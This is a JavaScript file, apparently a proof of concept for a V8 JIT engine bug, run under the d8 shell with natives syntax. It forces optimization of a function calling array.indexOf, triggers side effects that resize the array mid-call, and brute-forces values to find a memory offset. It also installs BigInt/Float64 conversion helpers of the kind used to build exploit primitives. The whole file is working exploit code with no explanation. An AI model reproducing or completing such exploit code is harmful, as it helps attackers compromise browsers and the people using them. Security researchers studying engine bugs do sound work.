let b = false;
let array = [Array,1.2];
let ab;
findme = undefined;
function f(a11) {
    if (b) {
        array[100000] = 1.1;
        if (b == 1) {
        }
        const v19 = new ArrayBuffer(1 << 30);
        ab = v19;
        findme = [4919,a11];
    }
    return a11;
}
const v23 = %NeverOptimizeFunction(f);
function foo(a25) {
    return array.indexOf(f(a25), 20);
}
foo(4919);
foo(4919);
const v33 = %OptimizeFunctionOnNextCall(foo);
foo(4919);
b = true;
foo(4919);
const v41 = new ArrayBuffer(8);
var conv_ab = v41;
const v44 = new Float64Array(conv_ab);
var f64 = v44;
const v47 = new BigUint64Array(conv_ab);
var u64 = v47;
function f49() {
    u64[0] = this;
    return f64[0];
}
const t35 = BigInt.prototype;
t35.to_float = f49;
function f54() {
    return "0x" + this.toString(16);
}
const t40 = BigInt.prototype;
t40.hex = f54;
const v62 = new Date();
print(v62);
for (let i66 = 32512; i66 < 32768; i66 += 1) {
    array = [Array,1.2];
    let off = foo(i66);
    print(`${i66}: ${off}`);
    if (off != 27) {
        console.log(off);
        console.log(`found: 0x${i66.toString(16)}`);
        const v86 = %DebugPrint(ab);
        break;
    }
}
print("done");
const v89 = new Date();
print(v89);
